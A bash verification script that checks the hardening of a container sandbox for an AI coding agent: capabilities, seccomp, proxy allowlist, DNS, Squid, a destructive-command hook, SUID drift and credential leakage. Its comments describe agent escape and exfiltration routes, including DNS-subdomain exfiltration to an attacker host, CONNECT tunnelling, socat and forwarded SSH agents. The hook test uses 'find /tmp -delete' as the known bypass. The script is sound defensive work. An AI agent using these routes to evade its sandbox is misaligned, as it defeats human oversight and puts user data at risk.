#!/usr/bin/env bash
# =============================================================================
# verify-sandbox.sh — run INSIDE the container to confirm hardening is active
# =============================================================================
# Usage (from host):
#   scripts/profile.sh <p> exec bash /workspace/temp_audit_package/scripts/verify-sandbox.sh
# (Stage the audit package first: scripts/stage-audit-package.sh <p>)
# =============================================================================
set -uo pipefail

PASS=0; FAIL=0; WARN=0
# Use ++VAR (pre-increment) — ((VAR++)) returns the pre-increment value, so
# when VAR is 0 the command exits 1 and breaks `check && pass || fail` chains.
pass() { printf '\033[0;32m[PASS]\033[0m %s\n' "$*"; ((++PASS)); }
fail() { printf '\033[0;31m[FAIL]\033[0m %s\n' "$*"; ((++FAIL)); }
warn() { printf '\033[1;33m[WARN]\033[0m %s\n' "$*"; ((++WARN)); }

# Non-root
[[ "$(id -u)" -ne 0 ]] && pass "non-root (UID $(id -u))" || fail "running as root"

# Writable rootfs is the current intended baseline (read_only: true broke VS
# Code Dev Containers; non-root + cap_drop: ALL is the boundary). Read mount
# flags from /proc/mounts — `touch /` can't distinguish ro from "/ is
# root-owned 755 and we're non-root", which would false-positive.
ROOT_OPTS=$(awk '$2=="/"{print $4; exit}' /proc/mounts)
case ",$ROOT_OPTS," in
  *,ro,*) warn "rootfs read-only (unexpected — compose changed?)" ;;
  *,rw,*) pass "rootfs writable (intended)" ;;
  *)      warn "rootfs mount flags unparsed: $ROOT_OPTS" ;;
esac

# /tmp writable
if touch /tmp/.t 2>/dev/null; then rm -f /tmp/.t; pass "/tmp writable (tmpfs)"; else fail "/tmp not writable"; fi

# Capabilities — anchor grep so we don't also match CapBnd/CapPrm/CapInh
CAP_EFF=$(grep '^CapEff:' /proc/self/status | awk '{print $2}')
[[ "$CAP_EFF" == "0000000000000000" ]] && pass "caps dropped" || warn "CapEff=$CAP_EFF"

# Seccomp — anchor grep; /proc/self/status also has Seccomp_filters: which
# otherwise pollutes the awk output and breaks the equality check.
SM=$(grep '^Seccomp:' /proc/self/status | awk '{print $2}')
[[ "$SM" == "2" ]] && pass "seccomp mode 2 active" || fail "seccomp not active (mode=$SM)"

# PID limit
PM=$(cat /sys/fs/cgroup/pids.max 2>/dev/null || echo unknown)
[[ "$PM" != "max" && "$PM" != "unknown" ]] && pass "pids.max=$PM" || warn "pids.max=$PM"

# Proxy routing — direct internet should fail, proxied should work
if curl -s --connect-timeout 3 --noproxy '*' https://github.com >/dev/null 2>&1; then
  fail "direct internet reachable (proxy bypassed)"
else
  pass "direct internet blocked"
fi
# api.anthropic.com is the reliable proxy-success probe — it's always on the
# allowlist (autonomous and planning modes both). api.github.com is only
# reachable in planning mode, so it would WARN by design in autonomous mode.
if curl -s --connect-timeout 5 https://api.anthropic.com >/dev/null 2>&1; then
  pass "proxied request to allowed domain works (api.anthropic.com)"
else
  warn "proxied request failed — check allowed_domains.txt / proxy running"
fi
if curl -s --connect-timeout 5 https://example.com >/dev/null 2>&1; then
  fail "disallowed domain (example.com) was reachable"
else
  pass "disallowed domain blocked by proxy"
fi

# DNS exfil tripwire (audit H2): with `internal: true` Docker still forwards
# DNS for any name to the host resolver, so an unconstrained agent could
# `getaddrinfo("base32-secret.attacker.tld")` and exfil via DNS subdomains.
# The fix is `dns: [127.0.0.1]` + extra_hosts in compose. To verify it took:
# resolution of any external name should fail. Use a guaranteed-not-internal
# name; on PASS, getent returns empty / nonzero. Internal names (egress-proxy)
# must still resolve via /etc/hosts.
if getent hosts example.com >/dev/null 2>&1; then
  fail "external DNS resolves (example.com) — DNS exfil channel open; check dns:/extra_hosts in docker-compose.yml"
else
  pass "external DNS does not resolve (DNS exfil blocked)"
fi
if getent hosts egress-proxy >/dev/null 2>&1; then
  pass "internal hostname resolves via /etc/hosts (egress-proxy)"
else
  fail "egress-proxy not resolvable — extra_hosts entry missing or wrong"
fi

# CONNECT-on-non-443 tripwire (audit H1): squid.conf must include
# `http_access deny CONNECT !SSL_ports`. Without it, CONNECT api.anthropic.com:80
# would tunnel raw TCP. Probe via the proxy and expect a 4xx Squid denial.
# Use 80 because it's in Safe_ports (so the test isolates the CONNECT-port
# control, not the Safe_ports filter).
#
# NOTE on the probe shape: an earlier version used
#   curl -x http://egress-proxy:3128 --proxytunnel https://api.anthropic.com:80/
# which surfaces curl's transport error (52 / empty reply) as the literal
# string "000" — same output you'd see if the proxy were truly off, masking
# real H1 regressions. We instead open a raw socket to the proxy, send the
# CONNECT request line, and parse Squid's HTTP response directly. A real H1
# regression would return "HTTP/1.1 200 Connection established"; the deny is
# a "HTTP/1.1 403 Forbidden".
code=$(python3 - <<'PY' 2>/dev/null
import socket
try:
    s = socket.create_connection(("egress-proxy", 3128), timeout=5)
    s.sendall(b"CONNECT api.anthropic.com:80 HTTP/1.1\r\n"
              b"Host: api.anthropic.com:80\r\n\r\n")
    data = s.recv(4096)
    s.close()
    line = data.split(b"\r\n", 1)[0].decode("latin1", "replace")
    parts = line.split()
    # status line: HTTP/1.1 <code> <reason>
    print(parts[1] if len(parts) >= 2 and parts[1].isdigit() else "000")
except Exception:
    print("000")
PY
)
if [[ "$code" == "403" || "$code" == "400" ]]; then
  pass "Squid denies CONNECT on non-443 ports (got HTTP $code)"
else
  fail "Squid allowed CONNECT to port 80 (HTTP $code) — add 'http_access deny CONNECT !SSL_ports' to squid.conf"
fi

# Deny-destructive hook tripwire (audit L8): config/hooks/deny-destructive.sh
# must be installed root-owned at the path referenced in settings.json's hooks
# block, executable, not writable by the agent, and must actually block the
# canonical bypass (find -delete) — script presence alone is insufficient,
# the behaviour is what closes the matcher gap.
HOOK=/usr/local/lib/claude-hooks/deny-destructive.sh
if [[ ! -x "$HOOK" ]]; then
  fail "deny-destructive hook missing or not executable at $HOOK"
elif [[ -w "$HOOK" ]]; then
  fail "deny-destructive hook is writable by agent (should be root:root 0755): $(stat -c '%U:%G %a' "$HOOK")"
else
  hook_out=$(printf '{"tool_name":"Bash","tool_input":{"command":"find /tmp -delete"}}' | "$HOOK" 2>/dev/null)
  # Tolerate both compact and pretty-printed JSON so the probe doesn't
  # silently fail if the hook's jq output formatting changes.
  if echo "$hook_out" | grep -Eq '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"'; then
    pass "deny-destructive hook blocks find -delete"
  else
    fail "deny-destructive hook present but not blocking find -delete (out: $hook_out)"
  fi
fi

# SUID/SGID inventory (audit M3): the container has a stock-Ubuntu SUID set
# baked in by the base image. Anything outside that set is drift — typically
# a wheel/.deb that snuck a SUID binary into the rootfs. The kernel boundary
# (no_new_privileges + cap_drop:ALL) neutralizes SUID at runtime, but the
# whole point of the tripwire is to surface drift before it's exploited.
# `ssh-agent` and `ssh-keysign` would specifically indicate openssh-client
# regressed, which is itself a finding worth shouting about.
EXPECTED_SUID='chage chfn chsh expiry gpasswd mount newgrp pam_extrausers_chkpwd passwd su umount unix_chkpwd'
ACTUAL_SUID=$(find / -xdev -perm /6000 -type f 2>/dev/null \
              | xargs -r -n1 basename 2>/dev/null \
              | sort -u \
              | tr '\n' ' ' \
              | sed 's/ $//')
EXPECTED_NORMALIZED=$(echo "$EXPECTED_SUID" | tr ' ' '\n' | sort -u | tr '\n' ' ' | sed 's/ $//')
if [[ "$ACTUAL_SUID" == "$EXPECTED_NORMALIZED" ]]; then
  pass "SUID/SGID inventory matches stock Ubuntu set"
else
  fail "SUID/SGID drift: expected '$EXPECTED_NORMALIZED' got '$ACTUAL_SUID'"
fi

# bwrap + socat + ssh are deliberately NOT installed (Claude Code's bwrap
# sandbox can't run here — seccomp correctly blocks unprivileged user
# namespaces — socat was a raw-TCP exfil channel bypassing Squid HTTP
# egress, and openssh-client is the tool surface that would weaponize
# any re-injected SSH_AUTH_SOCK). Absent is correct; presence is drift.
command -v bwrap >/dev/null && fail "bwrap present (should be uninstalled)" || pass "bwrap absent (intended)"
command -v socat >/dev/null && fail "socat present (should be uninstalled)" || pass "socat absent (intended)"
command -v ssh   >/dev/null && fail "ssh present (openssh-client should be purged)" || pass "ssh absent (intended)"

# VS Code Dev Containers leakage — controls we documented after the
# therapod audit. Each of these maps to a specific finding with a known
# regression risk (host VS Code settings can revert, copyGitConfig can
# get re-enabled, etc.). Keep these tight — they're tripwires, not an
# audit substitute.
[[ -z "${SSH_AUTH_SOCK:-}" ]] && pass "SSH_AUTH_SOCK unset (no agent forwarding)" \
  || fail "SSH_AUTH_SOCK=$SSH_AUTH_SOCK (VS Code SSH agent forwarding — disable remote.SSH.enableAgentForwarding)"
# shellcheck disable=SC2144 -- single-path test, no glob expansion needed
# Socket file alone is cosmetic — VS Code's attach helper creates them and
# `/tmp` tmpfs only clears on `--force-recreate`. The real regression signal
# is the *combination*: socket present AND (env re-injected OR ssh re-added).
# Either mitigation alone makes the inode unusable.
if ls /tmp/vscode-ssh-auth-*.sock >/dev/null 2>&1; then
  if [[ -z "${SSH_AUTH_SOCK:-}" ]] && ! command -v ssh >/dev/null 2>&1; then
    pass "VS Code SSH socket file present but env unset and ssh purged (cosmetic)"
  else
    fail "VS Code SSH auth socket present in /tmp AND mitigation incomplete (SSH_AUTH_SOCK set or ssh installed)"
  fi
else
  pass "no VS Code SSH auth socket in /tmp"
fi
[[ ! -e /home/agent/.gitconfig ]] && pass "no host .gitconfig copied into rootfs" \
  || fail "/home/agent/.gitconfig present (disable dev.containers.copyGitConfig on host)"
# Only flag host-reaching helpers. Benign in-container helpers (e.g. glab
# auth setup-git writes `!/usr/local/bin/glab auth git-credential`, gh does
# the same via /usr/local/bin/gh) are expected and use the sandbox's own
# tokens. The injections we're watching for are VS Code Dev Containers'
# IPC-backed shim (vscode-server / vscode-remote-containers paths) and macOS
# host helpers (osxkeychain, git-credential-manager) leaked via copyGitConfig.
if [[ -f /home/agent/.config/git/config ]] && \
   grep -qE 'helper\s*=.*(vscode-server|vscode-remote-containers|osxkeychain|git-credential-manager)' \
     /home/agent/.config/git/config; then
  fail "host-reaching credential.helper in .config/git/config (VS Code shim or macOS helper — profile.sh ensure_state should strip it)"
else
  pass "no host-reaching credential.helper in .config/git/config"
fi
# Belt-and-suspenders: the grep above only reads the GIT_CONFIG_GLOBAL file.
# `gitCredentialHelperConfigLocation` can target the *system* layer
# (/etc/gitconfig) instead, and a stray helper can also land in a repo-local
# /workspace/.git/config — neither of which the single-file grep sees. Ask git
# itself to resolve credential.helper across all layers and report the origin,
# so an injection at any layer surfaces. Same allowlist: gh/glab's own
# in-container shims (!/usr/local/bin/{gh,glab}) are expected and pass; only
# VS Code / host-keychain helpers fail. `|| true` because git exits non-zero
# when no helper is configured at all (the clean case).
helper_origins="$(git config --show-origin --get-all credential.helper 2>/dev/null || true)"
if printf '%s' "$helper_origins" \
     | grep -qE '(vscode-server|vscode-remote-containers|osxkeychain|git-credential-manager)'; then
  fail "host-reaching credential.helper resolved by git across config layers (system/global/local) — check origin: $helper_origins"
else
  pass "no host-reaching credential.helper across git config layers (system/global/local)"
fi
# Any UID-0 process other than PID 1 is drift — VS Code's attach flow
# occasionally leaves orphan `docker exec -u root` shells. Count them
# without counting the probe itself (awk invoked by verify-sandbox runs
# as the agent, not root, so it won't appear).
ROOT_PROCS=$(ps -eo pid,user | awk 'NR>1 && $2=="root" && $1!=1 {n++} END{print n+0}')
[[ "$ROOT_PROCS" -eq 0 ]] && pass "no stray UID-0 processes" \
  || fail "$ROOT_PROCS UID-0 process(es) running besides PID 1 (likely VS Code attach orphan)"

# Claude CLI present
command -v claude >/dev/null && pass "claude CLI present" || fail "claude CLI missing"

echo ""
echo "== $PASS passed | $FAIL failed | $WARN warnings =="
[[ $FAIL -eq 0 ]]
